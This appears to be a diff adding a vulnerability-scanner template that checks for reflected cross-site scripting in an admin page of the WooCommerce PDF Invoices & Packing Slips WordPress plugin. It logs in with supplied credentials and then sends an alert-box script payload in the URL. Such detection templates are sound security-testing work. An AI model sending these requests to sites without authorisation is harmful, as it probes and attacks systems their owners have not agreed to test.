@@ -1,0 +1,50 @@
+id: woocommerce-pdf-invoices-xss
+
+info:
+  name: WordPress WooCommerce PDF Invoices & Packing Slips <2.15.0 - Cross-Site Scripting
+  author: Akincibor
+  severity: medium
+  description: WordPress WooCommerce PDF Invoices & Packing Slips 2.15.0 does not escape some URLs before outputting them in attributes, leading to reflected cross-site scripting.
+  reference:
+    - https://wpscan.com/vulnerability/bc05dde0-98a2-46e3-b2c8-7bdc8c32394b
+    - https://wordpress.org/plugins/woocommerce-pdf-invoices-packing-slips/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 5.4
+    cwe-id: CWE-80
+  metadata:
+    max-request: 2
+  tags: xss,wp,wordpress,woocommerce,authenticated,wpscan,wp-plugin
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "><script>alert(document.domain)</script>"
+          - "WooCommerce PDF Invoices"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a00473045022100bd0730d194c6a63c945bf2e1934072fb59de8416e55a6a6c7a9d3181e45f94c6022036f73b1be5a755cee4948c6b8d9b90c1ef662028266c41eafd48c4f301fb5d60:922c64590222798bb761d5b6d8e72950
